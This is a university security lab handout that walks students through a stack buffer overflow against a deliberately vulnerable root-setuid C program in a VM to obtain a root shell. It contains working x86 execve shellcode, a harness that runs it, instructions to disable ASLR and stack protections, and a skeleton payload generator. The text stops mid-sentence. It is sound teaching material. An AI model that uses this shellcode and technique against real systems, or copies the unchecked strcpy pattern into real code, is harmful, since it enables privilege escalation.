---
title: |
  CITS3007 lab 5 (week 6)&nbsp;--&nbsp;Buffer overflows
---

It's recommended you complete this lab in pairs, if possible, and
discuss your results with your partner.

The objective of this lab is to gain insight into

a. buffer overflow vulnerabilities, and
b. setuid programs

and see how they can be exploited.
You will be given a `setuid` program with a buffer overflow vulnerability,
and your task is to develop a scheme to exploit the vulnerability and
gain root privileges.

<div style="border: solid 2pt orange; background-color: hsl(22.35, 100%, 85%, 1); padding: 1em;">

::: block-caption

Note -- Virtual Machine requirements

:::

Completing this lab requires you to have root access to the Linux kernel
of the VM (or other machine) you're running on. Otherwise, the command

```
sudo sysctl -w kernel.randomize_va_space=0
```

(in section 1.1, [Turning off countermeasures](#countermeasures))
will fail. Furthermore, the [shellcode](#shellcode) used in this lab
contains machine-code instructions specific to the x86-64 architecture.

Consequently, you will not be able to complete the lab using
any of the following methods:

***gitpod***

:   The [GitPod][gitpod] environment does ***not*** give you root
    access to the kernel;
    while using GitPod, you are running within a
    security-restricted [Docker container][docker] *within* a VM,
    and will be unable to change the way the kernel is running.

***a non–x86-64 virtual machine***

:   If you are using a VM with some architecture other than x86-64 (for instance, ARM64):
    exercises that involve injecting [shellcode][shellcode] will only work on the x86-64
    platform, because the machine instructions in the shellcode are specific to the x86-64
    instructions contained in the shellcode. If you normally
    use a VM with some other architecture, then to complete shellcode exercises, you
    will have to switch to a VM that uses an x86-64 architecture.

[gitpod]: https://gitpod.io/
[docker]: https://docs.docker.com/get-started/overview/

The preferred way of completing this lab is by using Vagrant (as outlined
in Lab 1) to run the standard CITS3007 standard development environment (SDE) image
from VirtualBox. Within that VM, you have
root access to the kernel, and all commands should complete successfully.
If you use some other method, the commands *might* work, but it's not guaranteed.

</div>

## 1. Setup

### 1.1. Turning off countermeasures { #countermeasures }

Modern operating systems implement several security mechanisms to make
buffer overflow attacks more difficult. To simplify our attacks, we need to disable them first.
It's worth understanding what these protections are, because even though they are enabled in
(for instance) modern Linux systems, embedded systems (and some other cut-down or minimal
operating systems) may still be vulnerable.



**Address Space Randomization**

:   Ubuntu and several other Linux-based systems use address space
    randomization to randomize the starting address of heap and stack. This
    makes guessing the exact addresses difficult. This feature can be
    disabled by running the following command in the CITS3007
    development environment:

    ```
    $ sudo sysctl -w kernel.randomize_va_space=0
    ```

    <div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em; margin-bottom: 1em">

    ::: block-caption

    The `sysctl` command

    :::

    This information isn't essential to the lab, but may be helpful in
    understanding what's going on here.

    The [`sysctl`](https://linux.die.net/man/8/sysctl) command
    (documented at `man 8 sysctl`) alters the parameters of a running
    Linux kernel. (The `sysctl` command should not be confused with the
    annoyingly similarly named
    [`systemctl`](https://man7.org/linux/man-pages/man1/systemctl.1.html)
    command,
    which has to do with starting and stopping daemon programs
    on a system.)

    The current value of the `randomize_va_space` ("randomize virtual
    address space") kernel parameter can be displayed by running the
    command:

    ```
    $ cat /proc/sys/kernel/randomize_va_space
    ```

    The result is a number, 0, 1 or 2, with the following meanings:

    - 0 -- No randomization. Everything is static.
    - 1 -- Conservative randomization. Shared libraries, stack, `mmap()`,
      VDSO and heap are randomized.
    - 2 -- Full randomization. In addition to elements listed in the
      previous point, memory managed through `brk()` is also randomized.

    (The [`brk()`](https://man7.org/linux/man-pages/man2/sbrk.2.html)
    system call, documented at `man 2 brk`, [adjusts the
    size of the heap](https://stackoverflow.com/a/31082353/6818792); it's one of the
    system calls typically used by `malloc` to allocate memory on the
    heap.)

    We use the `sysctl` command to set this parameter to 0.

    </div>


**Configuring `/bin/sh`**

:   In recent versions of Ubuntu OS, `/bin/sh` is a symbolic link pointing to the
    `/bin/dash` shell: run `ls -al /bin/sh` to see this.

    The [Dash][dash] program (as well as [Bash][bash]) implements a
    [countermeasure][bash-no-setuid] that
    prevents it from being executed in a setuid process. If the shell detects that the
    effective user ID differs from the actual user ID (see the previous lab),
    it will immediately change the effective user ID back to the real user ID, essentially
    dropping the privilege.

    [dash]: https://en.wikipedia.org/wiki/Almquist_shell#dash
    [bash]: https://en.wikipedia.org/wiki/Bash_(Unix_shell)
    [bash-no-setuid]: https://unix.stackexchange.com/questions/74527/setuid-bit-seems-to-have-no-effect-on-bash/74538#74538

    For these exercises, our victim program is a `setuid` program, and our attack
    relies on running `/bin/sh`, so the countermeasure in `/bin/dash` makes our attack more
    difficult.
    Therefore, we will link `/bin/sh` to `zsh` instead, a shell which lacks such protection
    (though with more effort, the countermeasure in `/bin/dash` can be defeated -- you
    might like to try doing so as a challenge task).

    <div style="border: solid 2pt orange; background-color: hsl(22.35, 100%, 85%, 1); padding: 1em;">

    ::: block-caption

    Take care!

    :::

    Take care running the commands following this warning box.

    The command `sudo ln -sf /bin/zsh /bin/sh` overwrites whatever file is currently at
    `/bin/sh`, and replaces it with a symbolic link that points to `/bin/zsh`. If there *is*
    no file at `/bin/zsh`, then `/bin/sh` becomes a "broken link"; and since many Linux programs
    and libraries rely on `/bin/sh` existing, they'll cease to work.

    So the `ln` command should only be run after `sudo apt-get install -y zsh` has completed
    successfully. It's assumed in CITS3007 labs that you will read error messages produced
    by commands, and seek assistance if they don't complete successfully.

    <details>

    <summary><span class="only-open">
    ...click for more
    </span></summary>

    If you *do* accidentally overwrite `/bin/sh`, then in the CITS3007 SDE, you can fix this
    by running `sudo ln -sf /usr/bin/dash /bin/sh`, which restores `/bin/sh` to its original
    state.

    Alternatively, to revert any alterations made in a VM, you can just destroy the current
    VM instance and create a new one. (This is the great advantage of virtualization
    technology -- no matter what damage is done to a VM, it's "cheap" to re-start from
    scratch.) You can do this by running (on your host laptop or other machine, in the
    directory where you Vagrantfile is located):

    ```
    $ vagrant destroy --force
    $ vagrant up --provider=virtualbox
    ```

    </details>

    </div>



    Inside the development environment VM, install the `zsh` package with the command
    `sudo apt-get update && sudo apt-get install -y zsh`.
    Then run the following command to link `/bin/sh` to `zsh`:

    ```
    $ sudo ln -sf /bin/zsh /bin/sh
    ```



    You can confirm that you've done this correctly by running the
    command:

    ```
    $ sh --version
    ```

    If all is working as expected, it should display:

    ```
    zsh 5.8 (x86_64-ubuntu-linux-gnu)
    ```


**Non-executable stack**

:   When the program runs, the memory segment containing the stack can
    be marked non-executable. This feature can be turned off during
    compilation, by passing the option "`-z execstack`" to `gcc`.
    This option is passed onto the linker, `ld`, and marks the
    output binary as requiring an *executable* stack.

    This option is documented in `man ld`, and we will discuss it
    further when compiling our programs.


**Stack canaries**

:   The GCC compiler can include code in a compiled program
    which inserts [stack canaries][canaries] in the stack frames
    of a running program, and before returning from a function,
    checks that the canary is unaltered.

    A RedHat article on compiler [stack protection flags][gcc-stack-protector]
    outlines the flags which enable stack canaries in GCC; we
    will use the `-fno-stack-protector` flag to ensure they're disabled.
    (Further documentation on these options is available in the
    [GCC manual][gcc-stack-man].) We discuss this option further
    when compiling our programs.

[canaries]: https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/
[gcc-stack-protector]: https://developers.redhat.com/articles/2022/06/02/use-compiler-flags-stack-protection-gcc-and-clang#stack_canary
[gcc-stack-man]: https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/Instrumentation-Options.html#Instrumentation-Options



<!--

## 2. Data corruption

Buffer overflow attacks

Changing program behavior by overwriting a local variable located near the vulnerable buffer on the stack;
By overwriting the return address in a stack frame to point to code selected by the attacker, usually called the shellcode. Once the function returns, execution will resume at the attacker's shellcode;
By overwriting a function pointer[2] or exception handler to point to the shellcode, which is subsequently executed;
By overwriting a local variable (or pointer) of a different stack frame, which will later be used by the function that owns that frame.[3]

-->

## 2. Shellcode

[*Shellcode*][shellcode] is a small portion of code that launches a
shell, and is widely used in code injection attacks.
The aim is to inject code into the running process that will allow us
to exploit the system.
In the buffer overflow attack we launch in this lab, we'll write that
code -- which is just a sequence of bytes -- into a location on the
stack, and try to convince the target program to execute it.

[shellcode]: https://en.wikipedia.org/wiki/Shellcode


Represented in C, a piece of shellcode might look like the following:

```{.c .numberLines}
// shellcode.c
#include <stdio.h>

int main() {
  char *name[2];
  name[0] = "/bin/sh";
  name[1] = NULL;
  execve(name[0], name, NULL);
}
```

Read about the Linux `execve` system call by typing [`man execve`][man-execve]; it
allows us to execute a program from C code. The `name` array is
effectively a list of pointers-to-`char`, with a `NULL` pointer used to
mark the end of the list.

[man-execve]: https://man7.org/linux/man-pages/man2/execve.2.html

However, we can't straightforwardly use GCC to obtain our shellcode.
Recall that shellcode is a *small* sequence of bytes that we want to
inject into a target process.
Try saving the above code as `shellcode.c`, and
compile it with `make shellcode.o shellcode`. Examine the size of the
compiled program with

```
$ du -sk shellcode
```

and you will see that the compiled binary is about 20 kilobytes -- far
too big and unwieldy for our purposes. (Once preprocessing is done on
the C code with `cpp`, and all header files and their definitions
are included, the resulting code is a lot bigger than the 9 lines above
would suggest. Read [here][teensy] about one user's attempts to get the
smallest possible "Hello world" program using GCC.)

[teensy]: http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html


Instead, the easiest way to construct shellcode is to write it in
[assembly language][assembly].[^assembly] The Intel 32-bit assembly code equivalent for the above C
code would be something like the following (which you are not required
to understand, but is presented here for interest):

[^assembly]: Also called [assembly][assembly], assembler language, assembler
  or symbolic machine code.

[assembly]: https://en.wikipedia.org/wiki/Assembly_language


``` {.asm .numberLines}
; Store the command on stack
xor  eax, eax
push eax
push "//sh"
push "/bin"
mov  ebx, esp ; ebx --> "/bin//sh": execve()'s 1st argument

; Construct the argument array argv[]
push eax ; argv[1] = 0
push ebx ; argv[0] --> "/bin//sh"
mov ecx, esp ; ecx --> argv[]: execve()'s 2nd argument

; For environment variable
xor edx, edx ; edx = 0: execve()'s 3rd argument

; Invoke execve()
xor eax, eax ;
mov al, 0x0b ; execve()'s system call number
int 0x80
```

A brief explanation of the code (again, you're not required
to understand this in detail) is:


[^registers]: A small, named memory cell used by the processor.
  See ["Registers and the stack"](#registers-and-the-stack).


- The `"/sh"` and `"/bin"` arguments are pushed onto the stack (lines
  1--5)
- We need to pass three arguments to `execve()` via the `ebx`, `ecx` and
  `edx` *registers*,[^registers] respectively.
  The majority of the shellcode basically constructs the content for these three arguments.
- The code in lines 17--19 is where we make the `execve` system call --
  that is, we request a service from the kernel.
  The kernel expects us to put a number identifying the system call
  we're after (in this case, `execve`) into the `a1` register,
  and then notify the kernel by invoking an "interrupt".

  So, we need to know what the system call number for `execve` is --
  it is `0x0b`.
  (A list of all the system calls and
  their numbers are found in a Linux header called `unistd_32.h`,
  usually found at `/usr/include/x86_64-linux-gnu/asm/unistd_32.h`.
  On Ubuntu, this file will only exist if you've installed the package
  `linux-libc-dev`.)

  We set `al` to `0x0b` (`al` represents the lower 8 bits
  of the `eax` register),
  and then execute the instruction "`int 0x80"`.

  The `int` instruction generates a call to an *interrupt handler* --
  a bit like an exception handler --
  and the `0x80` in `int 0x80` identifies a specific bit of kernel handler code
  which exists to handle system calls.

  That handler will look in register `a1` (part of
  the `eax` register) to find out what system
  call we want to execute,
  and in registers `ebx`, `ecx` and `edx` for the arguments
  to that system call.


<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">

::: block-caption

Programming in assembly

:::

If you're interested in further details on programming in
x86 assembly, this [guide][x86-asm-guide] from the University of
Virginia gives more details, such as how the `push` instruction
works with the hardware-supported call stack.

[x86-asm-guide]: https://www.cs.virginia.edu/~evans/cs216/guides/x86.html

Another useful reference is the [Wikibook](https://en.wikibooks.org) on
[x86 Assembly](https://en.wikibooks.org/wiki/X86_Assembly).

</div>

We won't do it in this lab, but the assembly code above can be assembled
using [`nasm`][nasm], an assembler for the x86 CPU architecture.
`nasm` would compile the above assembly into an object file (called,
say, `sploit.o`),
and that resulting object file contains the exact sequence of bytes we
need
to insert in order to invoke `/bin/sh`. The following table is an
extract from a compiled object file produced by `nasm`,[^objdump] and
shows that just
26 bytes (hex `0x1a`) are needed -- these 26 bytes
will have the same effect as the 20KB executable compiled from
`shellcode.c`.
The leftmost column shows offsets in
hex,
the second column the exact byte values we want, and the last column
the corresponding assembly code:

[^objdump]: You can replicate this by saving the assembly code as
  a file `sploit.s`, and inserting the lines: \
  \
  `section .text`  \
  &nbsp;&nbsp;`global _start` \
  &nbsp;&nbsp;&nbsp;&nbsp;`_start:` \
  \
  at the start. Compile it with the command `nasm -f elf32 sploit.s -o
  sploit.o`, then issue the command `objdump -d sploit.o` to see the
  disassembled shellcode.


```
off   bytes                       assembly code
---------------------------------------------------
   0:    31 c0                    xor    eax,eax
   2:    50                       push   eax
   3:    68 2f 2f 73 68           push   0x68732f2f
   8:    68 2f 62 69 6e           push   0x6e69622f
   d:    89 e3                    mov    ebx,esp
   f:    50                       push   eax
  10:    53                       push   ebx
  11:    89 e1                    mov    ecx,esp
  13:    31 d2                    xor    edx,edx
  15:    31 c0                    xor    eax,eax
  17:    b0 0b                    mov    al,0xb
  19:    cd 80                    int    0x80
```

[nasm]: https://www.nasm.us

### 2.1. Invoking the shellcode

Download the file [`bufoverflow-code.zip`][lab-zip] into the VM
(you can use the command `wget https://cits3007.arranstewart.io/labs/bufoverflow-code.zip`)
and unzip it.

[lab-zip]: https://cits3007.arranstewart.io/labs/bufoverflow-code.zip

`cd` into the `shellcode` directory, and take a look at
`call_shellcode.c` (reproduced below):

```{.C .numberLines}
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0)
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"


const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}
```

The purpose of this program is to demonstrate that our
shellcode byte-sequence does indeed invoke the shell
`/bin/sh`.

The byte sequences are stored in the array `shellcode` --
observe that the 32-bit version starts with "`\x31\xc0\x50`",
which is the byte sequence we get from compiling our assembly code.

What about line 27? The syntax C uses for this is unfortunately a bit
obscure -- but the gist of it is that we are saying "Declare `func` to be a pointer to some
*function* (i.e., a blob of executable code sitting in memory), and point it at the
address of the array `code`".
Usually, the bytes sitting in `code` would *not* be
executable, because they are
part of the call stack; but in our Makefile we pass the option "`-z
execstack`" to GCC, which says to make the stack memory segment
executable. Line 29 then invokes that function pointer, just as if it were a normal
function, and that will execute the code.

Discuss with your lab partner what is happening here; ask the
lab facilitator for an explanation if you're not sure.

<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">

::: block-caption

Function pointers

:::

We won't need to use function pointers elsewhere in the unit, but they do come in handy when
trying to exploit or reverse engineer exiting binaries.

The exact details of what we are doing is as follows.

Line 27 declares `func` as a *pointer to a function*, and points it
at the start of the `code` buffer. (We're allowed to do this, because when we use the
variable `code`, it "decays" from being a `char` array into a `char *`.
And `char *` is a sort of
"universal type" in C -- the `char *` type gives us a way of viewing or writing raw memory,
and it's legal for us to then convert from `char *` to another pointer type, such
as a function pointer.)

We cast the address of `code` into the type we want
by putting `(int(*)())` in front of it; that says the type to convert to
is "pointer to a function which takes no arguments and returns an
`int`". (Is that obvious from the declaration? Probably not. Function pointer declarations
in C are rather cryptic, and have to be read ["from the inside out"][func-ptr-decl].
Alternatively, as a shortcut, you can paste a declaration into <https://cdecl.org>,
and it will attempt to give you an "English translation" of what the declaration means.)

[func-ptr-decl]: https://www.cprogramming.com/tutorial/function-pointers.html#:~:text=Function%20Pointer%20Syntax

So: when the function pointer `func` is invoked (line 29), the instructions sitting in
`code` will be executed.

</div>

The code above includes two copies of the shellcode -- one is 32-bit and
the other is 64-bit. When we compile the program using the -m32 flag,
the 32-bit version will be used; without this flag, the 64-bit version
will be used. Using the provided Makefile, you can compile the code by
typing `make`.
Two binaries will be
created, `a32.out` (32-bit) and `a64.out` (64-bit).
Run them and describe your observations. As noted above,
the compilation uses the `execstack` option, which allows code to be executed from the stack;
without this option, the program will fail. Try deleting the flags "`-z
execstack`" from the makefile and compile and run the programs again -- what happens?





## 3. A vulnerable program

The vulnerable program used in this lab is called `stack.c`, which is in
the `code` folder from the zip file. This program has
a buffer overflow vulnerability, and your job is to exploit this
vulnerability and gain root privileges. The essential parts are shown
below (some inessential functions have been omitted):

```{.C .numberLines}
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str) {
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv) {
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    bof(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}
```

The above program has a buffer overflow vulnerability. It first reads an
input from a file called `badfile`, and then passes this input to another
buffer in the function `bof()`. The original input can have a maximum
length of 517 bytes, but the buffer in `bof()` is only `BUF_SIZE` bytes
long, which is less than 517. Because `strcpy()` does not check
boundaries, buffer overflow will occur.

Since this program is a
root-owned `setuid` program, if a normal user is able to exploit this
vulnerability, the user may be able to get a root shell. Note
that the program gets its input from a file called
`badfile`, which is under users' control. Your objective is to
create the contents for `badfile`, such that when the vulnerable program
copies the contents into its buffer, a root shell can be spawned.

### 3.1. Compilation

To compile the above vulnerable program, do not forget to turn off the
stack canaries and the
non-executable stack protections using the `-fno-stack-protector` and
"`-z execstack`" options.

After compilation, we need to make the program a root-owned `setuid`
program. We can achieve this by first changing the ownership of the
program to root, and then changing the permission to `4755` to enable
the `setuid` bit:

```
$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack
$ sudo chmod 4755 stack
```

It should be noted that changing ownership must be done before turning
on the `setuid` bit, because ownership change will cause the `setuid` bit to be turned off.

The compilation and setup commands are already included in Makefile, so
we just need to type `make`
to execute those commands. The variables L1, ..., L4 are set in Makefile; they will be used during the
compilation.

<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">

::: block-caption

Building the target programs with GNU Make

:::

Typing `make` should result in output like the following:

```
gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c
gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c
sudo chown root stack-L1 && sudo chmod 4755 stack-L1
gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c
gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg stack.c
sudo chown root stack-L2 && sudo chmod 4755 stack-L2
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -g -o stack-L3-dbg stack.c
sudo chown root stack-L3 && sudo chmod 4755 stack-L3
gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -o stack-L4 stack.c
gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -g -o stack-L4-dbg stack.c
sudo chown root stack-L4 && sudo chmod 4755 stack-L4
```

The following executables should get built:

```
stack-L1    stack-L1-dbg
stack-L2    stack-L2-dbg
stack-L3    stack-L3-dbg
stack-L4    stack-L4-dbg
```

The level 1 ("L1") programs should be the easiest to exploit, and are the
ones we use in this lab; and for each level, the ones with debugging
symbols enabled ("-dbg") should be very straightforward to exploit.

If you are able to successfully exploit the `stack-L1-dbg` and
`stack-L1` programs, then for a challenge, you might like to try
exploiting the L2, L3 and L4 programs.

</div>


### 3.2. Launching an attack on a 32-bit program

To exploit the buffer-overflow vulnerability in the target program, the
most important thing to know is the distance between the buffer’s
starting position and the place where the return-address is stored. We
will use a debugging method to find it out. Since we have the source
code of the target program, we can compile it with the debugging flag
turned on. That will make it more convenient to debug.

We will add the `-g` flag to the `gcc` command, so debugging information
is added to the binary.
If you run
`make`, the debugging version is already created. We will use GDB to
debug `stack-L1-dbg`. We need to
create a file called `badfile` before running the program.

```
$ touch badfile # Create an empty badfile
$ gdb stack-L1-dbg # start gdb
```

<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">

::: block-caption

ASLR in GDB

:::

When you run a program in GDB, ASLR address randomization gets
temporarily turned off. (If you already disabled ASLR using the
`systemctl` command, as described under
"[Turning off countermeasures](#countermeasures)", then obviously
this won't make any difference. But on systems that *do* have ASLR
enabled, this explains why the address you see in GDB can differ
from the addresses found in a normally-running program.)

It's not necessary for you to know the details of how this is done;
but if you're interested, take a look at [`man 2
personality`][personality]. On Linux, calling
`personality(ADDR_NO_RANDOMIZE)` changes how the stack and heap will be laid
out in memory.
Then, one can call [`fork()`][man-fork] and one of the [`exec`][man-exec] functions
to launch a new process in which ASLR is disabled.

[personality]: https://man7.org/linux/man-pages/man2/personality.2.html
[man-fork]: https://man7.org/linux/man-pages/man2/fork.2.html
[man-exec]: https://man7.org/linux/man-pages/man3/exec.3.html

</div>


Within GDB, run the commands:

```
(gdb) b bof
(gdb) run
(gdb) next
(gdb) print $ebp
(gdb) print &buffer
(gdb) quit
```

This will set a break point at function `bof()` and run the program.
We stop at the `bof` function and step to the `strcpy` call.

The `ebp` register is used at runtime to point to the "start"
(high-memory end) of the current stack frame.
When GDB stops "inside" the `bof()` function, it actually
stops *before* the `ebp` register is set to point to the
current stack frame, so if we print out the value of ebp here, we will
get the *caller's* `ebp` value. We need
to use `next` to execute a few instructions and stop after the `ebp`
register is modified to point to the stack
frame of the `bof()` function.

It should be noted that the frame pointer value obtained from GDB is
**different** from that during the actual execution (without using GDB).
This is because GDB has pushed some environment data into the stack
before running the debugged program. When the program runs directly
without using GDB, the stack does not have that data, so the actual
frame pointer value will be larger. You should keep this in mind when
constructing your payload.

<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">

::: block-caption

<span id="registers-and-the-stack">Registers and the stack</span>

:::

[register]: https://en.wikipedia.org/wiki/Processor_register

A [*register*][register] is a quickly accessible location available to a CPU. You
can think of it as being a `size_t` cell of memory hanging directly off
the CPU. (Often, the CPU will also provide ways of referring to just
*part* of a register, as well. For instance, there may be a
name by which you can refer to just the 8 lowest (`char`-sized)
bits of some register.)
Instead of having memory *addresses*, like locations in RAM, they have *names* --
for instance, `eax`, `ebx`, `ecx`, `edx`, and so on.
As a program executes, data from RAM will often be loaded
into the processor's registers so it can be operated on.

On 32-bit Intel machines, some of the registers have special purposes.

- The `eip` register: this is the "Extended Instruction Pointer"
  register (or just "Instruction Pointer") -- it keeps track of what
  instruction should be executed next.

  When a function is called -- and a new stack frame gets pushed
  onto the call stack -- the value of the `eip` register needs to be
  *saved* somewhere in the stack frame, so that when the current
  function returns, we know what instruction to execute afterwards.

- The `ebp` register: this is used to hold the "base pointer"
  for the current stack frame. As the stack frame is being set up,
  `ebp` will be used to store a "start" or "base" point for the stack
  frame, and the location of variables will be calculated relative to
  the value of `ebp`.

  On GCC, it's possible to use the function
  `__builtin_frame_address()` to
  get the value of the `ebp` register (see <https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html>).

- The `esp` register: the "current stack frame" pointer. This
  points to the spot in the current stack frame where
  new local variables should be inserted.
  As a stack frame is being set up, this starts off being equal
  to the `ebp` register. As memory is allocated for local variables,
  the `esp` register will get decremented.

`<div style="display: flex; justify-content: center;">`{=html}
![](images/x86-registers.png "x86 registers"){ width=60% }
`</div>`{=html}
`<div style="display: flex; justify-content: center;">`{=html}
x86 registers
`</div>`{=html}


(Diagram of x86 registers from University of Virginia cs216 [*x86
Assembly Guide*](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html) by
David Evans.)

</div>


To exploit the buffer
overflow vulnerability in the target program, we need to prepare a payload, and save
it inside `badfile`. We will use a Python program to do that.
(You won't need any extensive knowledge of Python for this lab, since you'll just be making
minor alterations to an existing script. But if you are not familiar with Python and
would like a tutorial on it, [Google][pytute] provides a helpful one.)
We provide a skeleton program called
`exploit.py`, which is included in the lab zip file.
The code is incomplete, and you will need to replace
some of the essential values in the code (marked with an
`XXX`):

[pytute]: https://developers.google.com/edu/python/introduction

```{.python .numberLines}
#!/usr/bin/python3
import sys

# XXX - replace the content with the actual shellcode
shellcode= (
  "\x90\x90\x90\x90"
  "\x90\x90\x90\x90"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # XXX - change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0x00           # XXX - change this number
offset = 0              # XXX - change this number

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

You will need to change the `exploit.py` code to:

- Write the correct sequence of shellcode bytes, at line 5.
  (Currently, the variable `shellcode` just contains do-nothing, "no-op"
  instructions -- these are a bit like writing semicolons without
  a statement in C, or `pass` statements in Python.)
- Alter the `start` variable at line 15. This specifies at exactly
  what offset in `badfile` the shellcode bytes are inserted.
- Alter the `ret` variable at line 20 and the `offset` variable
  at line 21. `offset` specifies a place in `badcode` where
  we want to insert an "address to return to", and `ret` is that
  address.

Running `exploit.py`
will generate a file `badfile`.
Then run the vulnerable program `stack`.

Here is what we're ultimately aiming for:
if you manage to implement the exploit correctly, you should be able to get a root shell
by creating `badfile` and running the `stack-L1` program:

```
$ ./exploit.py # create the badfile
$ ./stack-L1   # launch the attack by running the vulnerable program
# <---- Bingo! You’ve got a root shell!
```

However, working out what values to insert in our `exploit.py` script
at `start`, `ret` and `offset` will take some experimentation, which
we'll look at in the following section.
(By the way: if you do get the exploit working -- try running the command `id` to confirm
you are root. If you've successfully become root, the `id` command will say that your userid
is 0)


<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">

::: block-caption

Easier and harder exercises

:::

The following section gives some suggestions on how to identify the
values that should go in the `XXX` parts of `exploit.py`.

You may want to work through that section, and then try a fairly
easy exercise -- can you craft a `badfile` which will give you
root access when `./stack-L1-dbg` is run?

Then try customizing the values in `exploit.py` so that you can
exploit `./stack-L1`. It will require slightly different values to
`./stack-L1-dbg`. How can you find them?

Your lab facilitator may have some hints.


</div>


### 3.3. Hints on inserting your shellcode

It can be helpful to try and orient yourself while using GDB, and
work out where different parts of the stack are. In this section, we
show some commands you can run to find their locations.

<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">

::: block-caption

Overall memory layout

:::

It can be helpful to get an overall picture of how memory is laid out in the vulnerable
program -- we outline two ways of doing it.

While you have the `stack-L1-dbg` program stopped at a breakpoint in
GDB, open another terminal session and `ssh` into the VM so you can
run `ps -af | grep stack-L1-dbg`.

You should see something like the following:

```
$ ps -af | grep stack-L1-dbg
vagrant     1355    1340  0 02:43 pts/1    00:00:00 gdb ./stack-L1-dbg
vagrant     1357    1355  0 02:43 pts/1    00:00:00 /home/vagrant/lab04-code/code/stack-L1-dbg
vagrant     1362    1246  0 02:44 pts/0    00:00:00 grep --color=auto stack-L1-dbg
```

Here, the second line shows the (currently stopped) `stack-L1-dbg`
process; the second column is the *process ID*. If you run `<code>cat
/proc/<em>process_id</em>/maps</code>`{=html} (replacing *process_id* with the
process ID of the `stack-L1-dbg` process), you should get output like
the following:

```{.numberLines}
56555000-56558000 r-xp 00000000 fc:03 393228          /home/vagrant/lab04-code/code/stack-L1-dbg
56558000-56559000 r-xp 00002000 fc:03 393228          /home/vagrant/lab04-code/code/stack-L1-dbg
56559000-5655a000 rwxp 00003000 fc:03 393228          /home/vagrant/lab04-code/code/stack-L1-dbg
5655a000-5657c000 rwxp 00000000 00:00 0               [heap]
f7dd5000-f7fba000 r-xp 00000000 fc:03 1847105         /usr/lib32/libc-2.31.so
f7fba000-f7fbb000 ---p 001e5000 fc:03 1847105         /usr/lib32/libc-2.31.so
f7fbb000-f7fbd000 r-xp 001e5000 fc:03 1847105         /usr/lib32/libc-2.31.so
f7fbd000-f7fbe000 rwxp 001e7000 fc:03 1847105         /usr/lib32/libc-2.31.so
f7fbe000-f7fc1000 rwxp 00000000 00:00 0
f7fcb000-f7fcd000 rwxp 00000000 00:00 0
f7fcd000-f7fd0000 r--p 00000000 00:00 0               [vvar]
f7fd0000-f7fd1000 r-xp 00000000 00:00 0               [vdso]
f7fd1000-f7ffb000 r-xp 00000000 fc:03 1847101         /usr/lib32/ld-2.31.so
f7ffc000-f7ffd000 r-xp 0002a000 fc:03 1847101         /usr/lib32/ld-2.31.so
f7ffd000-f7ffe000 rwxp 0002b000 fc:03 1847101         /usr/lib32/ld-2.31.so
fffdd000-ffffe000 rwxp 00000000 00:00 0               [stack]
```

This gives you a picture of the process's virtual memory[^mem-seg] -- memory
addresses are in the leftmost column, with permissions for each memory segment
